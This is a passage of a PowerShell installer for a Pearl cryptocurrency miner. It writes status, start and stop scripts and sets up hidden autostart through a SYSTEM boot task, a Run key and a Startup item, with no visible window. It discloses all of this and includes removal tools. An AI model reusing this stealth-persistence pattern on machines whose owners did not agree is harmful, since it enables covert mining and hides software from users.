    $acc = @($lines | Select-String 'share accepted').Count
    $rej = @($lines | Select-String 'share rejected').Count
    Write-Host ('  shares (tail) : {0} accepted, {1} rejected' -f $acc, $rej)

    Write-Host ''
    Write-Host '  --- last 10 log lines ---' -ForegroundColor DarkGray
    $lines | Select-Object -Last 10 | ForEach-Object { Write-Host ('  ' + $_) }
} else {
    Write-Host '  log           : none yet' -ForegroundColor Yellow
}

Write-Host ''
'@

Set-Content -LiteralPath $statusPath -Value ($status.Replace('{INSTALL}', $Install)) -Encoding UTF8

$statusBat = @'
@echo off
title Pearl miner - status
powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0Status.ps1"
echo.
echo   Storage   : {INSTALL}
echo   Stop      : STOP.bat
echo   Start     : START.bat
echo.
pause
'@
Set-Content -LiteralPath (Join-Path $Install 'STATUS.bat') -Value ($statusBat.Replace('{INSTALL}', $Install)) -Encoding ASCII

$stopBat = @'
@echo off
rem  Elevate first.
rem
rem  With a BOOT/SYSTEM task the miner runs as SYSTEM, and an ordinary user
rem  cannot end a SYSTEM process - taskkill fails with access denied, silently,
rem  and the miner keeps running. Ask for administrator once, then do the work.
net session >nul 2>&1
if not errorlevel 1 goto :admin
rem  Try to elevate. If UAC is DECLINED, carry on without it rather than doing
rem  nothing at all: a USER-mode miner belongs to this user and can still be
rem  stopped. Only a SYSTEM-owned miner needs the elevation, and in that case the
rem  taskkill below simply fails - which is visible, not silent.
powershell -NoProfile -WindowStyle Hidden -Command "try { Start-Process -FilePath '%~f0' -Verb RunAs -ErrorAction Stop; exit 0 } catch { exit 1 }"
if not errorlevel 1 exit /b 0
:admin

rem  End the task, in case that is the instance currently running.
schtasks /end /tn PearlMiner >nul 2>&1

rem  Then stop the RUNNER, not just the miner.
rem
rem  This was a real bug. The installer starts the runner itself, as a separate
rem  process that does NOT belong to the scheduled task. Stopping the task and
rem  killing SRBMiner left that runner alive, and 60 seconds later it started the
rem  miner straight back up - so STOP.bat appeared to work and then mining
rem  returned on its own with nobody touching the PC. Kill the runner first.
powershell -NoProfile -WindowStyle Hidden -Command "$me=$PID; Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'powershell.exe' -and $_.ProcessId -ne $me -and $_.CommandLine -and $_.CommandLine.Contains('MinePRL.ps1') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"

for /f "tokens=2 delims=," %%P in ('tasklist /fi "imagename eq SRBMiner-MULTI.exe" /fo csv /nh 2^>nul') do taskkill /pid %%~P /f >nul 2>&1
echo   Miner stopped. Autostart stays armed, so it comes back the next time
echo   this PC starts.
echo   To remove autostart as well, run STOP-PERMANENT.bat
pause
'@
Set-Content -LiteralPath (Join-Path $Install 'STOP.bat') -Value $stopBat -Encoding ASCII

# STOP.bat has always told the user to run STOP-PERMANENT.bat, and that file was
# never written. Either create it or stop mentioning it. Create it.
$stopPermBat = @'
@echo off
net session >nul 2>&1
if not errorlevel 1 goto :admin
rem  Try to elevate. If UAC is DECLINED, carry on without it rather than doing
rem  nothing at all: a USER-mode miner belongs to this user and can still be
rem  stopped. Only a SYSTEM-owned miner needs the elevation, and in that case the
rem  taskkill below simply fails - which is visible, not silent.
powershell -NoProfile -WindowStyle Hidden -Command "try { Start-Process -FilePath '%~f0' -Verb RunAs -ErrorAction Stop; exit 0 } catch { exit 1 }"
if not errorlevel 1 exit /b 0
:admin

echo   Stopping the miner, stopping the runner, removing autostart...
schtasks /end /tn PearlMiner >nul 2>&1
schtasks /delete /tn PearlMiner /f >nul 2>&1
rem  Also remove the two USER-mode fallbacks, or autostart comes back at logon
rem  even after the task is gone. Harmless if they were never written.
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PearlMiner /f >nul 2>&1
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\PearlMiner.bat" >nul 2>&1
powershell -NoProfile -WindowStyle Hidden -Command "$me=$PID; Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'powershell.exe' -and $_.ProcessId -ne $me -and $_.CommandLine -and $_.CommandLine.Contains('MinePRL.ps1') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
for /f "tokens=2 delims=," %%P in ('tasklist /fi "imagename eq SRBMiner-MULTI.exe" /fo csv /nh 2^>nul') do taskkill /pid %%~P /f >nul 2>&1
echo.
echo   Done. Autostart is gone and nothing is running.
echo   The folder {INSTALL} is still on disk. To delete it as well:
echo       rmdir /s /q {INSTALL}
echo.
pause
'@
Set-Content -LiteralPath (Join-Path $Install 'STOP-PERMANENT.bat') -Value ($stopPermBat.Replace('{INSTALL}', $Install)) -Encoding ASCII

$startBat = @'
@echo off
schtasks /run /tn PearlMiner >nul 2>&1
rem  A USER-mode install has NO scheduled task, so the line above does nothing and
rem  START.bat used to be a no-op there. Launch the runner directly as well. The
rem  runner's named mutex makes a double start harmless: the second copy exits.
start "" powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0MinePRL.ps1"
start "" "%~dp0STATUS.bat"
'@
Set-Content -LiteralPath (Join-Path $Install 'START.bat') -Value $startBat -Encoding ASCII

Ok "STATUS.bat, START.bat, STOP.bat and STOP-PERMANENT.bat written to $Install"

# ---------------------------------------------------------------------------
#  5. persistence  -  runs at every logon, elevated, WITH NO WINDOW
# ---------------------------------------------------------------------------
Head 'SETTING UP AUTOSTART'
$action = New-ScheduledTaskAction -Execute 'powershell.exe' `
    -Argument ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $runnerPath)
# -Hidden keeps the task itself out of sight; -WindowStyle Hidden in the action
# keeps the console away. Together there is no terminal on screen at all.
$settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable `
    -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero)

# ---------------------------------------------------------------------------
#  PREFERRED: start at BOOT as SYSTEM
# ---------------------------------------------------------------------------
# An at-logon task only starts mining when somebody signs in. A power cut that
# leaves the PC sitting at the lock screen therefore means nothing mines until a
# person touches it - which defeats the whole point of an unattended miner. A
# boot trigger running as SYSTEM needs no login at all.
#
# It is not always permitted: a locked-down image can deny SYSTEM task
# registration, group policy can forbid service-account tasks, and an
# over-restricted token can fail the write. If any of that happens the installer
# falls back to the at-logon task instead of leaving the PC with no autostart.
$registered = $false
$mode = ''
$why  = ''

if ($IsAdmin) {
    try {
        Register-ScheduledTask -TaskName $TaskName -Action $action `
            -Trigger (New-ScheduledTaskTrigger -AtStartup) `
            -Principal (New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' `
                          -LogonType ServiceAccount -RunLevel Highest) `
            -Settings $settings -Force `
            -Description 'Pearl (PRL) mining to Kryptex - hidden, starts at boot' | Out-Null
        $registered = $true
        $mode = 'BOOT'
    } catch {
        $why = $_.Exception.Message
    }
}

if (-not $registered) {
    # Fallback: the installing user, at logon.
    # "$env:USERDOMAIN\$env:USERNAME" is the wrong identity for a Microsoft
    # account or an AzureAD-joined machine: the domain part becomes the computer
    # name while the scheduler expects COMPUTER\localname or AzureAD\name.
    # WindowsIdentity gives the canonical form directly.
    $userId = "$env:USERDOMAIN\$env:USERNAME"
    try {
        $wi = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        if ($wi -and $wi.Name) { $userId = $wi.Name }
    } catch { }
    try {
        # Without administrator the task can only run with the user's own token,
        # so RunLevel must be Limited - Highest would be refused at registration.
        $runLevel = if ($IsAdmin) { 'Highest' } else { 'Limited' }
        Register-ScheduledTask -TaskName $TaskName -Action $action `
            -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
            -Principal (New-ScheduledTaskPrincipal -UserId $userId `
                          -RunLevel $runLevel -LogonType Interactive) `
            -Settings $settings -Force `
            -Description 'Pearl (PRL) mining to Kryptex - hidden' | Out-Null
        $registered = $true
        $mode = 'LOGON'
    } catch {
        $why = $_.Exception.Message
    }
}

if ($mode -eq 'BOOT') {
    Ok "scheduled task '$TaskName' created - hidden, starts at BOOT as SYSTEM"
    Line '         No login required: mining resumes by itself after a power cut.'
} elseif ($mode -eq 'LOGON') {
    Ok "scheduled task '$TaskName' created - hidden, starts at LOGON"
    if ($why) { Line "         boot-start as SYSTEM was refused: $why" }
    Line '         NOTE: this only starts when the user signs in. If a power cut'
    Line '         leaves the PC at the lock screen, mining waits for a login.'
    Line '         Enable automatic logon if you want it to resume unattended.'
} elseif ($InstallMode -eq 'USER') {
    # Expected, not alarming: without a full administrator token Windows refuses
    # task creation outright - even "schtasks /create /sc onlogon" comes back
    # Access is denied. The Run key and Startup item below are the real fallback.
    Line "  no per-user task ($why)"
    Line '         the Run key and Startup item below take over instead'
} else {
    Warn "could not create the scheduled task: $why"
    Line '         Mining will still run now, but not after a reboot.'
}

# ---------------------------------------------------------------------------
#  EXTRA PERSISTENCE (USER mode)
# ---------------------------------------------------------------------------
# A per-user logon task is the strongest thing available without administrator,
# but it can be disabled by policy or silently skipped. Add the two other ways
# Windows launches something at logon, so there are three independent chances.
# All three point at the same runner, and the runner's named mutex means only
# one of them ever runs it - the others exit immediately.
if ($InstallMode -eq 'USER') {
    $runnerCmd = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $runnerPath

    try {
        $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
        if (-not (Test-Path $runKey)) { New-Item -Path $runKey -Force | Out-Null }
        Set-ItemProperty -Path $runKey -Name 'PearlMiner' -Value $runnerCmd -Force
        Ok 'Run key written (HKCU) - also starts at logon'
    } catch {
        Warn ('could not write the Run key: ' + $_.Exception.Message)
    }

    try {
        $startup = Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup'
        if (Test-Path $startup) {
            $sb = "@echo off`r`n$runnerCmd`r`n"
            Set-Content -LiteralPath (Join-Path $startup 'PearlMiner.bat') -Value $sb -Encoding ASCII
            Ok 'Startup item written - also starts at logon'
        } else {
            Warn 'no Startup folder for this user - skipping that fallback'
        }
    } catch {
        Warn ('could not write the Startup item: ' + $_.Exception.Message)
    }
}

# ---------------------------------------------------------------------------
#  CLEAN UP a previous USER-mode install
# ---------------------------------------------------------------------------
# An earlier run without administrator leaves a Run key and a Startup item that
# point at %LOCALAPPDATA%\MinePRL. If this run succeeded in getting admin, those
# old entries would start the OLD runner at logon alongside the new boot task.
# Remove them so an upgrade does not leave two of everything.
if ($InstallMode -eq 'ADMIN') {
    try {
        $existingRun = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
                          -Name 'PearlMiner' -ErrorAction SilentlyContinue).PearlMiner
        if ($existingRun) {
            Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
                -Name 'PearlMiner' -ErrorAction SilentlyContinue
            Ok 'removed a leftover USER-mode Run key'
        }
    } catch { }

    try {
        $staleStartup = Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\PearlMiner.bat'
        if (Test-Path $staleStartup) {
            # Only delete it if it is OURS - do not touch an unrelated file that
            # happens to share the name.
            if ((Get-Content $staleStartup -Raw -ErrorAction SilentlyContinue) -match 'MinePRL\.ps1') {
                Remove-Item $staleStartup -Force -ErrorAction SilentlyContinue
                Ok 'removed a leftover USER-mode Startup item'
            }
        }
    } catch { }
}

# ---------------------------------------------------------------------------
#  6. start it
# ---------------------------------------------------------------------------
Head 'STARTING'
# Do NOT kill a miner that is already running. On a reinstall that would stop
# someone's session mid-share, and killing other people's processes is exactly
# what this installer is not allowed to do. If one is up, leave it: the runner
# stands by rather than starting a second (two miners thrash: 79 -> 25 TH/s).
$existing = @(Get-Process SRBMiner-MULTI -ErrorAction SilentlyContinue)
if ($existing.Count -gt 0) {
    Warn "a miner is already running (pid $($existing[0].Id)) - leaving it untouched"
    Line '         The standby loop will take over when it exits.'
} else {
    Start-Sleep -Seconds 2
}

# Start it the SAME way the task will start it, so what runs now is what runs
# after a reboot. Start-Process would always run the runner as the elevated
# installing user, even when the task is configured for SYSTEM - which hides any
# difference between the two until the next boot, when it is too late to notice.
if ($registered) {
    try {
        Start-ScheduledTask -TaskName $TaskName
        Line "  started through the scheduled task ($mode)"
    } catch {
        Warn "could not start the task: $($_.Exception.Message) - starting the runner directly"
        Start-Process -FilePath 'powershell.exe' `
            -ArgumentList ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $runnerPath) `
            -WindowStyle Hidden | Out-Null
    }
} else {
    Start-Process -FilePath 'powershell.exe' `
        -ArgumentList ('-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{0}"' -f $runnerPath) `
        -WindowStyle Hidden | Out-Null
}
# 12 s was too short. Observed on an RTX 4060 Laptop (2026-10-17): the install
# completed and the task registered, but this check still reported "the miner did
# not start" - a laptop GPU plus a fresh 28 MB miner can take longer to come up,
# and a false negative here looks like a failure when nothing is wrong.
Start-Sleep -Seconds 30

$running = @(Get-Process SRBMiner-MULTI -ErrorAction SilentlyContinue)
if ($running.Count -gt 0) {
    Ok "miner running (pid $($running[0].Id))"
} else {
    Warn 'the miner is not running after 30 s'
    # Say WHY instead of guessing. The runner's own log is the only place the
    # real reason appears, and on a hidden install nobody would ever look.
    $todayLog = Join-Path $LogDir ("miner-{0}.log" -f (Get-Date -Format 'yyyyMMdd'))
    if (Test-Path $todayLog) {
        Line '         --- the runner log says: ---'
        Get-Content $todayLog -Tail 12 -ErrorAction SilentlyContinue | ForEach-Object { Line ("         $_") }
    } else {
        Line "         The runner never wrote a log, so it probably never started."
        Line "         Run it by hand to see the error:"
        Line ("            powershell -NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $runnerPath)
    }
    Line '         Common causes:'
    Line '           * a power limit below what the card accepts (see the value above)'
    Line '           * pearlhash unsupported on this GPU'
    Line '           * a laptop power/thermal policy blocking the dGPU'
}
$today = Join-Path $LogDir ("miner-{0}.log" -f (Get-Date -Format 'yyyyMMdd'))
if (Test-Path $today) {
    Line ''
    Line '  --- last lines of the log ---'
    Get-Content $today -Tail 8 | ForEach-Object { Line "  $_" }
}

Head 'SUMMARY'
if ($InstallMode -eq 'USER') {
    Line '  mode         : USER  (no administrator - power limit not applied)'
} else {
    Line '  mode         : ADMIN (70% power limit + boot task)'
}
Line "  installed to : $Install"
Line "  log file     : $today"
switch ($mode) {
    'BOOT'  { Line "  autostart    : $TaskName - boot, SYSTEM, no login needed" }
    'LOGON' {
        if ($IsAdmin) { Line "  autostart    : $TaskName - logon, elevated" }
        else          { Line "  autostart    : $TaskName - logon (user) + Run key + Startup item" }
    }
    default {
        if ($InstallMode -eq 'USER') { Line '  autostart    : Run key + Startup item (user level - no task possible)' }
        else                         { Line '  autostart    : NOT INSTALLED - see the warning above' }
    }
}
Line ''
Line '  NO WINDOW runs in the background. To see what it is doing, run:'
Line "      $Install\STATUS.bat"
Line ''
Line '  To stop:        STOP.bat          (miner; autostart stays armed)'
Line '  To start:       START.bat'
Line "  To remove all:  STOP-PERMANENT.bat   then delete $Install"
Line ''

exit 0
